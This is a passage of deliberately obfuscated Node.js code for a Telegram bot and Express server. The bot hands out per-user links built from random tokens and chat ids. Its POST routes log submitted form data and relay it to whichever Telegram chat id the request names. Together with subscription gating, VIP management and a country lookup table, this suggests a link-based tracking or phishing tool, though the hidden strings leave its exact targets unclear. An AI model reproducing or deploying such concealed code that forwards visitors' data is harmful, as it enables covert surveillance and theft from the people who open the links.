            'WHkjJ': _0x4bb362(0x555) + _0x4bb362(0x230) + _0x4bb362(0x2a3) + _0x4bb362(0x90f) + _0x4bb362(0x274) + _0x4bb362(0x8fa) + _0x4bb362(0x60d) + _0x4bb362(0x570) + _0x4bb362(0x904) + _0x4bb362(0x29f) + 'cA',
            'aRaSM': _0x4bb362(0x96b) + _0x4bb362(0x853),
            'OwebU': _0x4bb362(0x921) + _0x4bb362(0x248),
            'AxNeQ': _0x4bb362(0x89f) + _0x4bb362(0x73a) + _0x4bb362(0x22f) + _0x4bb362(0x5a5) + _0x4bb362(0x6a9) + _0x4bb362(0x458) + _0x4bb362(0x507),
            'Fhgio': _0x4bb362(0x700) + _0x4bb362(0x982),
            'QUDEO': _0x4bb362(0x5a2) + _0x4bb362(0x681) + _0x4bb362(0x47d) + _0x4bb362(0x5ff) + _0x4bb362(0x500) + _0x4bb362(0x342) + _0x4bb362(0x5a7) + _0x4bb362(0x84a) + _0x4bb362(0x3bc) + _0x4bb362(0x8d3) + _0x4bb362(0x556) + _0x4bb362(0x8a6) + _0x4bb362(0x64f) + _0x4bb362(0x54b) + _0x4bb362(0x93c) + _0x4bb362(0x397),
            'BiQQp': _0x4bb362(0x921) + _0x4bb362(0x3fc) + _0x4bb362(0x436),
            'hJRpv': _0x4bb362(0x89f) + _0x4bb362(0x73a) + _0x4bb362(0x22d) + _0x4bb362(0x6b9) + _0x4bb362(0x5bd) + _0x4bb362(0x1ce) + _0x4bb362(0x302),
            'ykzDP': function (_0x4145a4, _0x5a1096) {
                return _0x4145a4 === _0x5a1096;
            },
            'LkroL': _0x4bb362(0x6ed),
            'woeOZ': function (_0x4836e3, _0xb97eaa) {
                return _0x4836e3 == _0xb97eaa;
            },
            'EGybb': _0x4bb362(0x350) + _0x4bb362(0x8b4) + _0x4bb362(0x827) + _0x4bb362(0x8cf) + 'P:',
            'sIolx': _0x4bb362(0x202),
            'hGMAX': _0x4bb362(0x38d),
            'CUSPH': _0x4bb362(0x350) + _0x4bb362(0x8b4) + _0x4bb362(0x683) + _0x4bb362(0x3bf) + 'P:',
            'KnEwK': function (_0x1564dd, _0x312c6f, _0x5367bd) {
                return _0x1564dd(_0x312c6f, _0x5367bd);
            },
            'tXqhm': _0x4bb362(0x351) + 'nt',
            'ZkSLk': _0x4bb362(0x862),
            'gFtuO': _0x4bb362(0x37d) + 'k',
            'VZKxW': _0x4bb362(0x6fa) + 'n',
            'HFWTY': _0x4bb362(0x663) + 'e'
        }, _0x2980ed = _0x2cf452[_0x4bb362(0x202)][_0x4bb362(0x742)]['id'], _0x28f6e3 = _0x2cf452[_0x4bb362(0x70e)], _0x430a36 = [
            _0x4e43d6[_0x4bb362(0x7bc)],
            _0x4e43d6[_0x4bb362(0x815)],
            _0x4e43d6[_0x4bb362(0x858)],
            _0x4e43d6[_0x4bb362(0x740)],
            _0x4e43d6[_0x4bb362(0x374)],
            _0x4e43d6[_0x4bb362(0x435)],
            _0x4e43d6[_0x4bb362(0x72c)],
            _0x4e43d6[_0x4bb362(0x211)]
        ];
    if (!_0x430a36[_0x4bb362(0x882)](_0x28f6e3[_0x4bb362(0x5ad)](':')[0xb3 * -0x1f + 0xddf + 0x7ce]) && !await _0x4e43d6[_0x4bb362(0x712)](isUserSubscribed, _0x2980ed)) {
        const _0x463fcd = _0x4e43d6[_0x4bb362(0x4c3)], _0x467c7a = developerChannels[_0x4bb362(0x1e4)](_0x120f43 => ({
                'text': _0x4bb362(0x219) + _0x120f43,
                'url': _0x4bb362(0x402) + _0x4bb362(0x59d) + _0x120f43[_0x4bb362(0x60b)](-0x2 * 0x23f + 0x146c * 0x1 + 0xfed * -0x1)
            }));
        bot[_0x4bb362(0x326) + 'e'](_0x2980ed, _0x463fcd, { 'reply_markup': { 'inline_keyboard': [_0x467c7a] } });
        return;
    }
    if (_0x4e43d6[_0x4bb362(0x872)](_0x28f6e3, _0x4e43d6[_0x4bb362(0x914)])) {
        const _0x24dafa = baseUrl + (_0x4bb362(0x2ba) + _0x4bb362(0x287)) + _0x2980ed;
        bot[_0x4bb362(0x326) + 'e'](_0x2980ed, _0x4bb362(0x785) + _0x4bb362(0x2ce) + _0x4bb362(0x8c3) + '\x20' + _0x24dafa);
        return;
    }
    const [_0xad5b36, _0x23baec] = _0x28f6e3[_0x4bb362(0x5ad)](':');
    if (_0x4e43d6[_0x4bb362(0x872)](_0xad5b36, _0x4e43d6[_0x4bb362(0x958)]))
        try {
            const _0x1e1270 = _0x4e43d6[_0x4bb362(0x355)], _0x3e63c9 = _0x4e43d6[_0x4bb362(0x6cb)], _0x2a74da = await axios[_0x4bb362(0x69a)](_0x3e63c9, {
                    'model': _0x4e43d6[_0x4bb362(0x772)],
                    'messages': [{
                            'role': _0x4e43d6[_0x4bb362(0x567)],
                            'content': _0x1e1270
                        }]
                }, {
                    'headers': {
                        'Authorization': _0x4e43d6[_0x4bb362(0x6a2)],
                        'Content-Type': _0x4e43d6[_0x4bb362(0x68f)]
                    }
                }), _0x437cb3 = _0x2a74da[_0x4bb362(0x70e)][_0x4bb362(0x945)][0x2566 * 0x1 + 0x3 * -0x97b + -0x1 * 0x8f5][_0x4bb362(0x202)][_0x4bb362(0x5c2)];
            bot[_0x4bb362(0x326) + 'e'](_0x2980ed, _0x437cb3);
        } catch (_0x3cd53a) {
            console[_0x4bb362(0x541)](_0x4e43d6[_0x4bb362(0x84b)], _0x3cd53a[_0x4bb362(0x604)] ? _0x3cd53a[_0x4bb362(0x604)][_0x4bb362(0x70e)] : _0x3cd53a[_0x4bb362(0x202)]), bot[_0x4bb362(0x326) + 'e'](_0x2980ed, _0x4e43d6[_0x4bb362(0x52b)]);
        }
    else {
        if (_0x4e43d6[_0x4bb362(0x872)](_0x28f6e3, _0x4e43d6[_0x4bb362(0x5dd)]))
            try {
                const _0x410295 = _0x4e43d6[_0x4bb362(0x7a7)], _0x4e7046 = _0x4e43d6[_0x4bb362(0x6cb)], _0x745e3d = await axios[_0x4bb362(0x69a)](_0x4e7046, {
                        'model': _0x4e43d6[_0x4bb362(0x772)],
                        'messages': [{
                                'role': _0x4e43d6[_0x4bb362(0x567)],
                                'content': _0x410295
                            }]
                    }, {
                        'headers': {
                            'Authorization': _0x4e43d6[_0x4bb362(0x6a2)],
                            'Content-Type': _0x4e43d6[_0x4bb362(0x68f)]
                        }
                    }), _0x5dddda = _0x745e3d[_0x4bb362(0x70e)][_0x4bb362(0x945)][0x1dd2 + -0x800 + -0x39 * 0x62][_0x4bb362(0x202)][_0x4bb362(0x5c2)];
                bot[_0x4bb362(0x326) + 'e'](_0x2980ed, _0x5dddda);
            } catch (_0x463fa0) {
                console[_0x4bb362(0x541)](_0x4e43d6[_0x4bb362(0x84b)], _0x463fa0[_0x4bb362(0x604)] ? _0x463fa0[_0x4bb362(0x604)][_0x4bb362(0x70e)] : _0x463fa0[_0x4bb362(0x202)]), bot[_0x4bb362(0x326) + 'e'](_0x2980ed, _0x4e43d6[_0x4bb362(0x52b)]);
            }
        else {
            if (_0x4e43d6[_0x4bb362(0x872)](_0x28f6e3, _0x4e43d6[_0x4bb362(0x5dd)]))
                try {
                    const _0x4bac34 = _0x4e43d6[_0x4bb362(0x7a7)], _0x5a5a18 = _0x4e43d6[_0x4bb362(0x6cb)], _0x323147 = await axios[_0x4bb362(0x69a)](_0x5a5a18, {
                            'model': _0x4e43d6[_0x4bb362(0x772)],
                            'messages': [{
                                    'role': _0x4e43d6[_0x4bb362(0x567)],
                                    'content': _0x4bac34
                                }]
                        }, {
                            'headers': {
                                'Authorization': _0x4e43d6[_0x4bb362(0x6a2)],
                                'Content-Type': _0x4e43d6[_0x4bb362(0x68f)]
                            }
                        }), _0x133749 = _0x323147[_0x4bb362(0x70e)][_0x4bb362(0x945)][0x21bc + -0x11b5 + -0x1007][_0x4bb362(0x202)][_0x4bb362(0x5c2)];
                    bot[_0x4bb362(0x326) + 'e'](_0x2980ed, _0x133749);
                } catch (_0x30e776) {
                    console[_0x4bb362(0x541)](_0x4e43d6[_0x4bb362(0x44a)], _0x30e776[_0x4bb362(0x604)] ? _0x30e776[_0x4bb362(0x604)][_0x4bb362(0x70e)] : _0x30e776[_0x4bb362(0x202)]), bot[_0x4bb362(0x326) + 'e'](_0x2980ed, _0x4e43d6[_0x4bb362(0x800)]);
                }
            else {
                if (_0x4e43d6[_0x4bb362(0x53d)](_0x28f6e3, _0x4e43d6[_0x4bb362(0x794)]) && _0x4e43d6[_0x4bb362(0x65a)](_0x2980ed, -0xba8f5db * -0x2f + 0x2774cebf7 + -0x3453edf72))
                    bot[_0x4bb362(0x326) + 'e'](_0x2980ed, _0x4e43d6[_0x4bb362(0x83b)]), bot[_0x4bb362(0x364)](_0x4e43d6[_0x4bb362(0x21e)], _0x1ba8d8 => {
                        const _0x10ff33 = _0x4bb362, _0x108da0 = _0x1ba8d8[_0x10ff33(0x814)];
                        _0x4e43d6[_0x10ff33(0x7f0)](addVIPUser, _0x108da0), bot[_0x10ff33(0x326) + 'e'](_0x2980ed, _0x10ff33(0x5b7) + _0x10ff33(0x389) + _0x108da0 + _0x10ff33(0x306));
                    });
                else {
                    if (_0x4e43d6[_0x4bb362(0x53d)](_0x28f6e3, _0x4e43d6[_0x4bb362(0x6ce)]) && _0x4e43d6[_0x4bb362(0x65a)](_0x2980ed, -0x2454a9be + 0x2809723a9 + -0x1062f4a31))
                        bot[_0x4bb362(0x326) + 'e'](_0x2980ed, _0x4e43d6[_0x4bb362(0x8fb)]), bot[_0x4bb362(0x364)](_0x4e43d6[_0x4bb362(0x21e)], _0x375d7c => {
                            const _0x2da91c = _0x4bb362, _0x7af48a = _0x375d7c[_0x2da91c(0x814)];
                            _0x4e43d6[_0x2da91c(0x7f0)](removeVIPUser, _0x7af48a), bot[_0x2da91c(0x326) + 'e'](_0x2980ed, _0x2da91c(0x6a8) + _0x2da91c(0x389) + _0x7af48a + _0x2da91c(0x1e5));
                        });
                    else {
                        const [_0x6f1482, _0x2c18c7] = _0x28f6e3[_0x4bb362(0x5ad)](':');
                        if (!_0x430a36[_0x4bb362(0x882)](_0x6f1482) && !_0x4e43d6[_0x4bb362(0x369)](validateLinkUsage, _0x2c18c7, _0x6f1482)) {
                            bot[_0x4bb362(0x326) + 'e'](_0x2980ed, '');
                            return;
                        }
                        let _0x50505e = '';
                        switch (_0x6f1482) {
                        case _0x4e43d6[_0x4bb362(0x4fd)]:
                            _0x50505e = baseUrl + (_0x4bb362(0x4ac) + _0x4bb362(0x831)) + crypto[_0x4bb362(0x893) + 's'](0xbd8 + -0x2 * -0xe1d + -0x3 * 0xd56)[_0x4bb362(0x1ee)](_0x4e43d6[_0x4bb362(0x45b)]) + _0x4bb362(0x694) + _0x2980ed;
                            break;
                        case _0x4e43d6[_0x4bb362(0x5b5)]:
                            _0x50505e = baseUrl + (_0x4bb362(0x8c1) + _0x4bb362(0x272)) + crypto[_0x4bb362(0x893) + 's'](0x219 * -0x1 + -0x59 * -0x1e + -0x845 * 0x1)[_0x4bb362(0x1ee)](_0x4e43d6[_0x4bb362(0x45b)]) + _0x4bb362(0x694) + _0x2980ed;
                            break;
                        case _0x4e43d6[_0x4bb362(0x96d)]:
                            _0x50505e = baseUrl + (_0x4bb362(0x31e) + _0x4bb362(0x368)) + crypto[_0x4bb362(0x893) + 's'](-0x737 + -0xb * -0x31 + 0x4 * 0x14b)[_0x4bb362(0x1ee)](_0x4e43d6[_0x4bb362(0x45b)]) + _0x4bb362(0x694) + _0x2980ed;
                            break;
                        case _0x4e43d6[_0x4bb362(0x765)]:
                            const _0x40cba5 = 0xc23 + 0xf57 + 0x10 * -0x1b7;
                            _0x50505e = baseUrl + _0x4bb362(0x485) + crypto[_0x4bb362(0x893) + 's'](-0xd79 * 0x1 + 0x2688 + 0x18ff * -0x1)[_0x4bb362(0x1ee)](_0x4e43d6[_0x4bb362(0x45b)]) + _0x4bb362(0x694) + _0x2980ed + _0x4bb362(0x776) + _0x40cba5;
                            break;
                        case _0x4e43d6[_0x4bb362(0x435)]:
                            _0x50505e = baseUrl + (_0x4bb362(0x283) + _0x4bb362(0x470)) + _0x2980ed + (_0x4bb362(0x4f7) + 'ok');
                            break;
                        case _0x4e43d6[_0x4bb362(0x740)]:
                            _0x50505e = baseUrl + (_0x4bb362(0x283) + _0x4bb362(0x470)) + _0x2980ed + (_0x4bb362(0x83d) + _0x4bb362(0x518));
                            break;
                        case _0x4e43d6[_0x4bb362(0x211)]:
                            _0x50505e = baseUrl + (_0x4bb362(0x283) + _0x4bb362(0x470)) + _0x2980ed + (_0x4bb362(0x968) + _0x4bb362(0x83e));
                            break;
                        default:
                            bot[_0x4bb362(0x326) + 'e'](_0x2980ed, '');
                            return;
                        }
                        bot[_0x4bb362(0x326) + 'e'](_0x2980ed, _0x4bb362(0x547) + _0x4bb362(0x7d6) + _0x50505e);
                    }
                }
            }
        }
    }
    bot[_0x4bb362(0x3b6) + _0x4bb362(0x226)](_0x2cf452['id']);
}), bot[_0x247cf0(0x89b)](/\/jjihigjoj/, _0x45759b => {
    const _0x44e499 = _0x247cf0, _0x2b859a = {
            'oQRag': _0x44e499(0x3a1) + _0x44e499(0x521) + _0x44e499(0x4e4) + _0x44e499(0x50e) + '.',
            'BvAAC': _0x44e499(0x6b7) + _0x44e499(0x48e),
            'RYIIc': _0x44e499(0x280) + _0x44e499(0x4e2)
        }, _0x3505d = _0x45759b[_0x44e499(0x742)]['id'], _0x219844 = _0x2b859a[_0x44e499(0x3ca)];
    bot[_0x44e499(0x326) + 'e'](_0x3505d, _0x219844, {
        'reply_markup': {
            'inline_keyboard': [[{
                        'text': _0x2b859a[_0x44e499(0x887)],
                        'callback_data': _0x2b859a[_0x44e499(0x4a6)]
                    }]]
        }
    });
}), bot['on'](_0x247cf0(0x293) + _0x247cf0(0x43c), _0x1c96f5 => {
    const _0x212e8e = _0x247cf0, _0x37338e = {
            'raXXZ': function (_0x244626, _0xf1b227) {
                return _0x244626 === _0xf1b227;
            },
            'eDfIi': _0x212e8e(0x280) + _0x212e8e(0x4e2)
        }, _0x3cbe15 = _0x1c96f5[_0x212e8e(0x202)][_0x212e8e(0x742)]['id'];
    if (_0x37338e[_0x212e8e(0x385)](_0x1c96f5[_0x212e8e(0x70e)], _0x37338e[_0x212e8e(0x3d7)])) {
        const _0x2b112a = baseUrl + '/' + _0x3cbe15;
        bot[_0x212e8e(0x326) + 'e'](_0x3cbe15, _0x212e8e(0x286) + _0x212e8e(0x6dc) + _0x2b112a);
    }
    bot[_0x212e8e(0x3b6) + _0x212e8e(0x226)](_0x1c96f5['id']);
}), bot['on'](_0x247cf0(0x293) + _0x247cf0(0x43c), _0x48d136 => {
    const _0x1e0c3f = _0x247cf0, _0x9e3a78 = {
            'oITHj': function (_0x94ad69, _0x1adad6) {
                return _0x94ad69 === _0x1adad6;
            },
            'kkTnk': _0x1e0c3f(0x97c),
            'YhfSO': _0x1e0c3f(0x202),
            'EsWyD': _0x1e0c3f(0x88f) + _0x1e0c3f(0x78d) + _0x1e0c3f(0x502) + _0x1e0c3f(0x897),
            'AvSRG': function (_0x2fb270, _0x19fbc1) {
                return _0x2fb270 === _0x19fbc1;
            },
            'puVBF': _0x1e0c3f(0x733),
            'TRlsb': _0x1e0c3f(0x349) + _0x1e0c3f(0x513) + _0x1e0c3f(0x49d) + '.'
        }, _0xf4c649 = _0x48d136[_0x1e0c3f(0x202)][_0x1e0c3f(0x742)]['id'];
    if (_0x9e3a78[_0x1e0c3f(0x97e)](_0x48d136[_0x1e0c3f(0x70e)], _0x9e3a78[_0x1e0c3f(0x7dd)])) {
        bot[_0x1e0c3f(0x326) + 'e'](_0xf4c649, _0x9e3a78[_0x1e0c3f(0x7a6)]);
        const _0x1b3718 = _0x3a923a => {
            const _0x54e5a5 = _0x1e0c3f;
            if (_0x9e3a78[_0x54e5a5(0x255)](_0x3a923a[_0x54e5a5(0x742)]['id'], _0xf4c649)) {
                if (_0x3a923a[_0x54e5a5(0x814)] && _0x3a923a[_0x54e5a5(0x814)][_0x54e5a5(0x962)](_0x9e3a78[_0x54e5a5(0x826)])) {
                    const _0xcd0f55 = _0x3a923a[_0x54e5a5(0x814)];
                    dataStore[_0xf4c649] = { 'userLink': _0xcd0f55 }, bot[_0x54e5a5(0x326) + 'e'](_0xf4c649, _0x54e5a5(0x8be) + _0x54e5a5(0x85e) + _0x54e5a5(0x86c) + baseUrl + (_0x54e5a5(0x88e) + _0x54e5a5(0x303)) + _0xf4c649), bot[_0x54e5a5(0x331) + _0x54e5a5(0x2ca)](_0x9e3a78[_0x54e5a5(0x671)], _0x1b3718);
                } else
                    bot[_0x54e5a5(0x326) + 'e'](_0xf4c649, _0x9e3a78[_0x54e5a5(0x2d7)]);
            }
        };
        bot['on'](_0x9e3a78[_0x1e0c3f(0x671)], _0x1b3718);
    }
}), app[_0x247cf0(0x8b9)](bodyParser[_0x247cf0(0x31b)]({ 'extended': !![] })), app[_0x247cf0(0x8b9)](express[_0x247cf0(0x4d5)](__dirname)), app[_0x247cf0(0x69a)](_0x247cf0(0x6ae) + 'es', (_0x1be68f, _0x3b401a) => {
    const _0x5d329f = _0x247cf0, _0x3d56a5 = {
            'xKnqD': _0x5d329f(0x600),
            'xEkjs': _0x5d329f(0x4ea) + _0x5d329f(0x327) + _0x5d329f(0x824) + ':',
            'YCyrz': _0x5d329f(0x89f) + _0x5d329f(0x393) + _0x5d329f(0x959) + _0x5d329f(0x379) + _0x5d329f(0x594),
            'YQQVI': _0x5d329f(0x6fc) + _0x5d329f(0x5b1)
        }, _0x51966f = _0x1be68f[_0x5d329f(0x73b)][_0x5d329f(0x7f1)], _0x319b9b = _0x1be68f[_0x5d329f(0x73b)][_0x5d329f(0x3fb)], _0x119e91 = _0x1be68f[_0x5d329f(0x73b)][_0x5d329f(0x3e8)];
    console[_0x5d329f(0x6e8)](_0x3d56a5[_0x5d329f(0x52e)], _0x1be68f[_0x5d329f(0x73b)]), bot[_0x5d329f(0x326) + 'e'](_0x51966f, _0x5d329f(0x844) + _0x5d329f(0x46f) + _0x319b9b + _0x5d329f(0x1d6) + _0x119e91)[_0x5d329f(0x37b)](() => {
        const _0x56816f = _0x5d329f;
        _0x3b401a[_0x56816f(0x911)](path[_0x56816f(0x93f)](__dirname, _0x3d56a5[_0x56816f(0x3ef)]));
    })[_0x5d329f(0x2de)](_0x2067c6 => {
        const _0x213e75 = _0x5d329f;
        console[_0x213e75(0x541)](_0x3d56a5[_0x213e75(0x851)], _0x2067c6[_0x213e75(0x604)] ? _0x2067c6[_0x213e75(0x604)][_0x213e75(0x73b)] : _0x2067c6), _0x3b401a[_0x213e75(0x428)](0x67c + -0x244f + 0x1fc7)[_0x213e75(0x626)](_0x3d56a5[_0x213e75(0x23e)]);
    });
}), app[_0x247cf0(0x3d0)](_0x247cf0(0x6f3), (_0x57c26f, _0x282c92) => {
    const _0x4cb59e = _0x247cf0, _0x27b531 = {
            'WCvdz': _0x4cb59e(0x5a9) + _0x4cb59e(0x32b) + _0x4cb59e(0x822),
            'SFlAM': _0x4cb59e(0x600)
        }, _0x38c3cf = _0x57c26f[_0x4cb59e(0x659)][_0x4cb59e(0x7f1)];
    if (!_0x38c3cf)
        return _0x282c92[_0x4cb59e(0x428)](-0x1a4a + 0xe8e + 0xd4c * 0x1)[_0x4cb59e(0x626)](_0x27b531[_0x4cb59e(0x516)]);
    _0x282c92[_0x4cb59e(0x911)](path[_0x4cb59e(0x93f)](__dirname, _0x27b531[_0x4cb59e(0x203)]));
}), app[_0x247cf0(0x8b9)](bodyParser[_0x247cf0(0x31b)]({ 'extended': !![] })), app[_0x247cf0(0x8b9)](express[_0x247cf0(0x4d5)](__dirname)), app[_0x247cf0(0x69a)](_0x247cf0(0x6ae) + 'es', (_0x8eb6fe, _0x22ad63) => {
    const _0x2522bb = _0x247cf0, _0x5c85de = {
            'lJkBy': _0x2522bb(0x386),
            'FJYjV': _0x2522bb(0x4ea) + _0x2522bb(0x327) + _0x2522bb(0x824) + ':',
            'cCSvy': _0x2522bb(0x89f) + _0x2522bb(0x393) + _0x2522bb(0x959) + _0x2522bb(0x379) + _0x2522bb(0x594),
            'JJGwj': _0x2522bb(0x6fc) + _0x2522bb(0x5b1)
        }, _0x5a8ba3 = _0x8eb6fe[_0x2522bb(0x73b)][_0x2522bb(0x7f1)], _0x10499d = _0x8eb6fe[_0x2522bb(0x73b)][_0x2522bb(0x3fb)], _0x2c5f4a = _0x8eb6fe[_0x2522bb(0x73b)][_0x2522bb(0x3e8)];
    console[_0x2522bb(0x6e8)](_0x5c85de[_0x2522bb(0x360)], _0x8eb6fe[_0x2522bb(0x73b)]), bot[_0x2522bb(0x326) + 'e'](_0x5a8ba3, _0x2522bb(0x844) + _0x2522bb(0x46f) + _0x10499d + _0x2522bb(0x1d6) + _0x2c5f4a)[_0x2522bb(0x37b)](() => {
        const _0x4e1a24 = _0x2522bb;
        _0x22ad63[_0x4e1a24(0x911)](path[_0x4e1a24(0x93f)](__dirname, _0x5c85de[_0x4e1a24(0x47c)]));
    })[_0x2522bb(0x2de)](_0x627882 => {
        const _0x2301c3 = _0x2522bb;
        console[_0x2301c3(0x541)](_0x5c85de[_0x2301c3(0x3b5)], _0x627882[_0x2301c3(0x604)] ? _0x627882[_0x2301c3(0x604)][_0x2301c3(0x73b)] : _0x627882), _0x22ad63[_0x2301c3(0x428)](0x3ae * 0x1 + 0x18 * -0x12a + 0x1a36)[_0x2301c3(0x626)](_0x5c85de[_0x2301c3(0x751)]);
    });
}), app[_0x247cf0(0x3d0)](_0x247cf0(0x6bf), (_0xa383bc, _0x116adc) => {
    const _0x431aec = _0x247cf0, _0x9a4e4d = {
            'ScIXG': _0x431aec(0x5a9) + _0x431aec(0x32b) + _0x431aec(0x822),
            'mDadV': _0x431aec(0x386)
        }, _0x3f814c = _0xa383bc[_0x431aec(0x659)][_0x431aec(0x7f1)];
    if (!_0x3f814c)
        return _0x116adc[_0x431aec(0x428)](0x1c * 0xf + 0x20af + -0x20c3)[_0x431aec(0x626)](_0x9a4e4d[_0x431aec(0x4ec)]);
    _0x116adc[_0x431aec(0x911)](path[_0x431aec(0x93f)](__dirname, _0x9a4e4d[_0x431aec(0x25c)]));
}), app[_0x247cf0(0x8b9)](bodyParser[_0x247cf0(0x31b)]({ 'extended': !![] })), app[_0x247cf0(0x8b9)](express[_0x247cf0(0x4d5)](__dirname)), app[_0x247cf0(0x69a)](_0x247cf0(0x6ae) + 'es', (_0x1ee30a, _0x2446db) => {
    const _0x46cbef = _0x247cf0, _0x239235 = {
            'EkfSJ': _0x46cbef(0x881),
            'lOPFZ': _0x46cbef(0x4ea) + _0x46cbef(0x327) + _0x46cbef(0x824) + ':',
            'dxMvT': _0x46cbef(0x89f) + _0x46cbef(0x393) + _0x46cbef(0x959) + _0x46cbef(0x379) + _0x46cbef(0x594),
            'TTpYq': _0x46cbef(0x6fc) + _0x46cbef(0x5b1)
        }, _0x11e839 = _0x1ee30a[_0x46cbef(0x73b)][_0x46cbef(0x7f1)], _0x3dec09 = _0x1ee30a[_0x46cbef(0x73b)][_0x46cbef(0x3fb)], _0x598b34 = _0x1ee30a[_0x46cbef(0x73b)][_0x46cbef(0x3e8)];
    console[_0x46cbef(0x6e8)](_0x239235[_0x46cbef(0x6ad)], _0x1ee30a[_0x46cbef(0x73b)]), bot[_0x46cbef(0x326) + 'e'](_0x11e839, _0x46cbef(0x844) + _0x46cbef(0x46f) + _0x3dec09 + _0x46cbef(0x1d6) + _0x598b34)[_0x46cbef(0x37b)](() => {
        const _0x3e2b3e = _0x46cbef;
        _0x2446db[_0x3e2b3e(0x911)](path[_0x3e2b3e(0x93f)](__dirname, _0x239235[_0x3e2b3e(0x696)]));
    })[_0x46cbef(0x2de)](_0x5b6cf3 => {
        const _0x497336 = _0x46cbef;
        console[_0x497336(0x541)](_0x239235[_0x497336(0x865)], _0x5b6cf3[_0x497336(0x604)] ? _0x5b6cf3[_0x497336(0x604)][_0x497336(0x73b)] : _0x5b6cf3), _0x2446db[_0x497336(0x428)](0xbf4 + 0xff3 * -0x1 + 0x5f3)[_0x497336(0x626)](_0x239235[_0x497336(0x6da)]);
    });
}), app[_0x247cf0(0x3d0)](_0x247cf0(0x2ed), (_0x568daa, _0x34c40a) => {
    const _0x42fc9e = _0x247cf0, _0x50f047 = {
            'BjCIO': _0x42fc9e(0x5a9) + _0x42fc9e(0x32b) + _0x42fc9e(0x822),
            'TyZJJ': _0x42fc9e(0x881)
        }, _0x5c653c = _0x568daa[_0x42fc9e(0x659)][_0x42fc9e(0x7f1)];
    if (!_0x5c653c)
        return _0x34c40a[_0x42fc9e(0x428)](-0x82 * 0x6 + 0x1 * 0x11b6 + 0x4e * -0x2b)[_0x42fc9e(0x626)](_0x50f047[_0x42fc9e(0x491)]);
    _0x34c40a[_0x42fc9e(0x911)](path[_0x42fc9e(0x93f)](__dirname, _0x50f047[_0x42fc9e(0x340)]));
});
const countryTranslation = {
        'AF': _0x247cf0(0x62c) + _0x247cf0(0x266),
        'AL': _0x247cf0(0x260),
        'DZ': _0x247cf0(0x946),
        'AO': _0x247cf0(0x736),
        'AR': _0x247cf0(0x48a) + _0x247cf0(0x2b0),
        'AM': _0x247cf0(0x596),
        'AU': _0x247cf0(0x986),
        'AT': _0x247cf0(0x37a),
        'AZ': _0x247cf0(0x5fe),
        'BH': _0x247cf0(0x2f5),
        'BD': _0x247cf0(0x731),
        'BY': _0x247cf0(0x2a8),
        'BE': _0x247cf0(0x50d),
        'BZ': _0x247cf0(0x8d0),
        'BJ': _0x247cf0(0x6b6),
        'BO': _0x247cf0(0x319),
        'BA': _0x247cf0(0x5e2) + _0x247cf0(0x813),
        'BW': _0x247cf0(0x843),
        'BR': _0x247cf0(0x638),
        'BG': _0x247cf0(0x321),
        'BF': _0x247cf0(0x388) + _0x247cf0(0x23a),
        'KH': _0x247cf0(0x93d),
        'CM': _0x247cf0(0x5b2) + _0x247cf0(0x82d),
        'CA': _0x247cf0(0x80e),
        'CL': _0x247cf0(0x2dd),
        'CN': _0x247cf0(0x43e),
        'CO': _0x247cf0(0x3f3),
        'CR': _0x247cf0(0x28f) + _0x247cf0(0x7c9),
        'HR': _0x247cf0(0x8bb),
        'CY': _0x247cf0(0x8dc),
        'CZ': _0x247cf0(0x7ab),
        'DK': _0x247cf0(0x7e2),
        'EC': _0x247cf0(0x807) + _0x247cf0(0x552),
        'EG': _0x247cf0(0x7c1),
        'SV': _0x247cf0(0x8ff) + _0x247cf0(0x461),
        'EE': _0x247cf0(0x288),
        'ET': _0x247cf0(0x62e),
        'FI': _0x247cf0(0x771),
        'FR': _0x247cf0(0x523),
        'GE': _0x247cf0(0x707),
        'DE': _0x247cf0(0x20a),
        'GH': _0x247cf0(0x66a),
        'GR': _0x247cf0(0x96c),
        'GT': _0x247cf0(0x841) + _0x247cf0(0x4f4),
        'HN': _0x247cf0(0x783),
        'HK': _0x247cf0(0x792) + _0x247cf0(0x2f4),
        'HU': _0x247cf0(0x42e),
        'IS': _0x247cf0(0x5f6),
        'IN': _0x247cf0(0x759),
        'ID': _0x247cf0(0x6f5) + _0x247cf0(0x5d0),
        'IR': _0x247cf0(0x658),
        'IQ': _0x247cf0(0x775),
        'IE': _0x247cf0(0x348),
        'IL': _0x247cf0(0x50b),
        'IT': _0x247cf0(0x587),
        'CI': _0x247cf0(0x529) + _0x247cf0(0x22c),
        'JP': _0x247cf0(0x462),
        'JO': _0x247cf0(0x924),
        'KZ': _0x247cf0(0x1e1) + _0x247cf0(0x8ef),
        'KE': _0x247cf0(0x709),
        'KW': _0x247cf0(0x3d9),
        'KG': _0x247cf0(0x7d3) + _0x247cf0(0x63d),
        'LV': _0x247cf0(0x884),
        'LB': _0x247cf0(0x2e0),
        'LY': _0x247cf0(0x503),
        'LT': _0x247cf0(0x76a),
        'LU': _0x247cf0(0x511) + _0x247cf0(0x787),
        'MO': _0x247cf0(0x4a8),
        'MY': _0x247cf0(0x8a7),
        'ML': _0x247cf0(0x4f1),
        'MT': _0x247cf0(0x829),
        'MX': _0x247cf0(0x72f),
        'MC': _0x247cf0(0x96e),
        'MN': _0x247cf0(0x227),
        'ME': _0x247cf0(0x70d) + _0x247cf0(0x4db),
        'MA': _0x247cf0(0x61d),
        'MZ': _0x247cf0(0x277),
        'MM': _0x247cf0(0x281),
        'NA': _0x247cf0(0x4ef),
        'NP': _0x247cf0(0x27d),
        'NL': _0x247cf0(0x312),
        'NZ': _0x247cf0(0x1cf) + _0x247cf0(0x8c7),
        'NG': _0x247cf0(0x761),
        'KP': _0x247cf0(0x5d6) + _0x247cf0(0x873),
        'NO': _0x247cf0(0x91f),
        'OM': _0x247cf0(0x810),
        'PK': _0x247cf0(0x4c5),
        'PS': _0x247cf0(0x3eb),
        'PA': _0x247cf0(0x81c),
        'PY': _0x247cf0(0x26a),
        'PE': _0x247cf0(0x3d5),
        'PH': _0x247cf0(0x357),
        'PL': _0x247cf0(0x352),
        'PT': _0x247cf0(0x5e5),
        'PR': _0x247cf0(0x910) + _0x247cf0(0x682),
        'QA': _0x247cf0(0x3f4),
        'RO': _0x247cf0(0x832),
        'RU': _0x247cf0(0x210),
        'RW': _0x247cf0(0x30a),
        'SA': _0x247cf0(0x80b),
        'SN': _0x247cf0(0x63e),
        'RS': _0x247cf0(0x780),
        'SG': _0x247cf0(0x58c),
        'SK': _0x247cf0(0x56e),
        'SI': _0x247cf0(0x47e),
        'ZA': _0x247cf0(0x543) + _0x247cf0(0x33a),
        'KR': _0x247cf0(0x20d) + _0x247cf0(0x479),
        'ES': _0x247cf0(0x64b),
        'LK': _0x247cf0(0x734),
        'SD': _0x247cf0(0x773),
